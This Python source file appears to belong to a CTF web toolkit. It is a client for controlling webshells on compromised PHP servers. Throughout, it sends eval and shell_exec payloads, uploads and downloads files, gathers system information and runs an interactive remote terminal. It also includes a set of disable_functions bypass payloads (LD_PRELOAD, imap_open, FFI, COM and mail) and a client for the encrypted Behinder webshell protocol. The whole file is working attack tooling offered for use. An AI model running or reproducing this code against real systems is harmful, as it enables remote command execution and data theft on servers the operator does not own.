"""
CTF Web Toolkit - Webshell Client
交互式连接各类 Webshell，支持：
  - 普通 GET/POST 一句话连接
  - 文件管理（上传/下载/列目录）
  - 交互式伪终端
  - 冰蝎（Behinder）协议连接
  - 反弹 Shell 辅助
"""

import os
import sys
import base64
import hashlib
import json
import readline  # 启用命令历史
from typing import Optional
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section


# ══════════════════════════════════════════════
#  通用 Webshell 连接器
# ══════════════════════════════════════════════

class ShellClient:
    """
    连接普通一句话木马（GET/POST eval/system 型）
    """

    def __init__(self, url: str, password: str = "cmd",
                 method: str = "POST",
                 proxy: Optional[str] = None,
                 cookies: Optional[dict] = None,
                 headers: Optional[dict] = None):
        self.url = url
        self.password = password
        self.method = method.upper()
        self.req = Requester(proxy=proxy, cookies=cookies or {},
                             headers=headers or {})
        self._cwd = None

    # ── 基础命令执行 ──────────────────────────
    def execute(self, cmd: str) -> str:
        """执行命令，返回输出"""
        php_code = f"echo shell_exec({json.dumps(cmd)});"
        return self._eval(php_code)

    def _eval(self, php_code: str) -> str:
        """发送 PHP eval payload"""
        try:
            if self.method == "GET":
                resp = self.req.get(self.url, params={self.password: php_code})
            else:
                resp = self.req.post(self.url, data={self.password: php_code})
            if resp:
                return resp.text.strip()
        except Exception as e:
            err(f"请求失败: {e}")
        return ""

    # ── 文件操作 ──────────────────────────────
    def read_file(self, path: str) -> str:
        return self._eval(f"echo file_get_contents({json.dumps(path)});")

    def write_file(self, path: str, content: str) -> bool:
        b64 = base64.b64encode(content.encode()).decode()
        result = self._eval(
            f'file_put_contents({json.dumps(path)}, base64_decode("{b64}"));'
            f'echo file_exists({json.dumps(path)})?"ok":"fail";'
        )
        return "ok" in result

    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """上传本地文件到目标服务器"""
        try:
            with open(local_path, "rb") as f:
                content = f.read()
            b64 = base64.b64encode(content).decode()
            result = self._eval(
                f'file_put_contents({json.dumps(remote_path)}, base64_decode("{b64}"));'
                f'echo "ok";'
            )
            if "ok" in result:
                ok(f"上传成功: {remote_path}")
                return True
        except Exception as e:
            err(f"上传失败: {e}")
        return False

    def download_file(self, remote_path: str, local_path: str) -> bool:
        """从目标服务器下载文件"""
        content_b64 = self._eval(
            f'echo base64_encode(file_get_contents({json.dumps(remote_path)}));'
        )
        if not content_b64:
            err(f"文件读取失败: {remote_path}")
            return False
        try:
            content = base64.b64decode(content_b64)
            with open(local_path, "wb") as f:
                f.write(content)
            ok(f"下载成功: {local_path} ({len(content)} bytes)")
            return True
        except Exception as e:
            err(f"下载失败: {e}")
            return False

    def list_dir(self, path: str = ".") -> list:
        """列出目录"""
        result = self._eval(
            f'$a=scandir({json.dumps(path)});'
            f'foreach($a as $f){{'
            f'  $p={json.dumps(path.rstrip("/"))}."/".$f;'
            f'  $t=is_dir($p)?"d":"-";'
            f'  $s=@filesize($p);'
            f'  echo $t." ".$s." ".$f."\\n";'
            f'}}'
        )
        files = []
        for line in result.splitlines():
            parts = line.split(" ", 2)
            if len(parts) == 3:
                ftype, size, name = parts
                files.append({"type": ftype, "size": size, "name": name})
                color = "\033[34m" if ftype == "d" else "\033[0m"
                print(f"  {color}{ftype} {size:>10} {name}\033[0m")
        return files

    def get_info(self) -> dict:
        """获取目标系统基础信息"""
        section("目标信息收集")
        info_php = (
            'echo json_encode(['
            '"os"=>PHP_OS,'
            '"php"=>PHP_VERSION,'
            '"user"=>get_current_user(),'
            '"cwd"=>getcwd(),'
            '"doc_root"=>$_SERVER["DOCUMENT_ROOT"]??"",'
            '"server_addr"=>$_SERVER["SERVER_ADDR"]??"",'
            '"disable_functions"=>ini_get("disable_functions"),'
            '"safe_mode"=>ini_get("safe_mode"),'
            '"open_basedir"=>ini_get("open_basedir"),'
            ']);'
        )
        result = self._eval(info_php)
        try:
            data = json.loads(result)
            for k, v in data.items():
                if v:
                    ok(f"  {k}: {v}")
            return data
        except Exception:
            info(f"原始输出: {result[:500]}")
            return {}

    def bypass_disable_functions(self, cmd: str) -> str:
        """
        尝试绕过 disable_functions 执行命令
        依次尝试多种方式
        """
        section(f"绕过 disable_functions: {cmd}")
        bypass_methods = [
            # 方式1：mail
            f'mail("a@b.c","","","","-oQ/tmp -X/tmp/x.php");sleep(1);echo file_get_contents("/tmp/x.php");',
            # 方式2：putenv + LD_PRELOAD（需要上传 .so）
            f'putenv("CMD={cmd}");putenv("LD_PRELOAD=/tmp/bypass.so");mail("","","","");',
            # 方式3：com_dotnet（Windows）
            f'$o=new COM("WScript.shell");echo $o->exec("cmd /c {cmd}")->StdOut->ReadAll();',
            # 方式4：imap_open SSRF
            'imap_open("{localhost:143/cmd=' + cmd + '}/","x","x");',
            # 方式5：FFI（PHP 7.4+）
            f'$ffi=FFI::cdef("int system(const char *command);","libc.so.6");$ffi->system("{cmd} > /tmp/out");echo file_get_contents("/tmp/out");',
            # 方式6：proc_open
            f'$p=proc_open("{cmd}",array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")),$pipes);echo stream_get_contents($pipes[1]);',
        ]

        for i, code in enumerate(bypass_methods, 1):
            result = self._eval(code)
            if result and len(result.strip()) > 0:
                found(f"绕过方式 {i}", result[:200])
                return result
        warn("所有绕过方式均失败")
        return ""

    # ── 交互式 Shell ──────────────────────────
    def interactive(self):
        """启动交互式伪终端（模拟终端体验）"""
        section(f"交互式 Shell: {self.url}")
        warn("输入 'exit' 或 Ctrl+C 退出")
        warn("特殊命令: !upload <local> <remote>  !download <remote> <local>  !ls <path>  !info")

        # 获取当前目录
        self._cwd = self._eval("echo getcwd();") or "/var/www/html"
        ok(f"连接成功，当前目录: {self._cwd}")

        while True:
            try:
                prompt = f"\033[32m[{self._cwd}]\033[0m $ "
                cmd = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print("\n")
                break

            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit", "bye"):
                break

            # 内置命令
            if cmd.startswith("!upload "):
                parts = cmd.split()
                if len(parts) >= 3:
                    self.upload_file(parts[1], parts[2])
                continue
            elif cmd.startswith("!download "):
                parts = cmd.split()
                if len(parts) >= 3:
                    self.download_file(parts[1], parts[2])
                continue
            elif cmd.startswith("!ls"):
                parts = cmd.split()
                path = parts[1] if len(parts) > 1 else self._cwd
                self.list_dir(path)
                continue
            elif cmd == "!info":
                self.get_info()
                continue
            elif cmd.startswith("!read "):
                path = cmd[6:].strip()
                print(self.read_file(path))
                continue

            # cd 命令处理
            if cmd.startswith("cd "):
                new_dir = cmd[3:].strip()
                result = self._eval(
                    f'chdir({json.dumps(new_dir)});echo getcwd();'
                )
                if result:
                    self._cwd = result
                continue

            # 普通命令执行
            full_cmd = f"cd {self._cwd} && {cmd} 2>&1"
            output = self.execute(full_cmd)
            if output:
                print(output)

            # 更新 cwd
            new_cwd = self._eval("echo getcwd();")
            if new_cwd:
                self._cwd = new_cwd


# ══════════════════════════════════════════════
#  冰蝎协议客户端（Behinder）
# ══════════════════════════════════════════════

class BehinderClient:
    """
    冰蝎 4.x PHP shell 客户端
    使用 AES-128-CBC 加密通信
    """

    def __init__(self, url: str, password: str = "rebeyond",
                 proxy: Optional[str] = None):
        self.url = url
        self.password = password
        # 密钥为 md5(password) 前16位
        self.key = hashlib.md5(password.encode()).hexdigest()[:16].encode()
        self.req = Requester(proxy=proxy)
        self._session_key = None

    def _aes_encrypt(self, data: bytes) -> bytes:
        """AES-128-CBC 加密"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            import os as _os
            iv = _os.urandom(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            enc = cipher.encrypt(pad(data, 16))
            return iv + enc
        except ImportError:
            err("需要安装 pycryptodome: pip install pycryptodome")
            return b""

    def _aes_decrypt(self, data: bytes) -> bytes:
        """AES-128-CBC 解密"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
            iv = data[:16]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(data[16:]), 16)
        except ImportError:
            err("需要安装 pycryptodome: pip install pycryptodome")
            return b""
        except Exception:
            return b""

    def _send(self, payload: bytes) -> Optional[bytes]:
        """发送冰蝎格式请求"""
        encrypted = self._aes_encrypt(payload)
        if not encrypted:
            return None
        b64 = base64.b64encode(encrypted).decode()
        try:
            resp = self.req.post(self.url, data=b64,
                                 headers={"Content-Type": "application/octet-stream"})
            if resp and resp.content:
                # 解密响应
                raw = base64.b64decode(resp.text)
                return self._aes_decrypt(raw)
        except Exception as e:
            err(f"冰蝎通信失败: {e}")
        return None

    def execute(self, cmd: str) -> str:
        """执行命令"""
        php_payload = (
            f"class C{{public function __invoke($p){{eval($p);}}}};"
            f"$c=new C();"
            f"$c('echo shell_exec({json.dumps(cmd)});');"
        )
        payload = f"cmd|{php_payload}".encode()
        result = self._send(payload)
        return result.decode(errors="replace") if result else ""

    def interactive(self):
        """冰蝎交互式 shell"""
        section(f"冰蝎连接: {self.url}")
        info(f"密码: {self.password}  密钥: {self.key.decode()}")
        warn("输入 'exit' 退出")

        while True:
            try:
                cmd = input("\033[31m[Behinder]\033[0m $ ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not cmd or cmd.lower() == "exit":
                break
            output = self.execute(cmd)
            if output:
                print(output)


# ══════════════════════════════════════════════
#  快速连接工厂
# ══════════════════════════════════════════════

def connect(url: str, password: str = "cmd",
            shell_type: str = "eval",
            method: str = "POST",
            proxy: Optional[str] = None,
            cookies: Optional[str] = None) -> ShellClient:
    """
    快速创建 shell 客户端
    shell_type: eval / system / behinder
    """
    section(f"连接 Webshell: {url}")
    info(f"  类型: {shell_type}  密码: {password}  方法: {method}")

    # 解析 cookie
    cookie_dict = {}
    if cookies:
        for pair in cookies.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookie_dict[k.strip()] = v.strip()

    if shell_type == "behinder":
        return BehinderClient(url, password, proxy)

    client = ShellClient(url, password, method, proxy, cookie_dict)

    # 连接测试
    info("  测试连接...")
    test = client.execute("echo CTF_TEST_$(id)")
    if "CTF_TEST_" in test:
        ok(f"  连接成功: {test.strip()[:80]}")
    else:
        warn(f"  响应异常，请检查 URL / 密码 / 方法")
        warn(f"  原始响应: {test[:100]!r}")

    return client
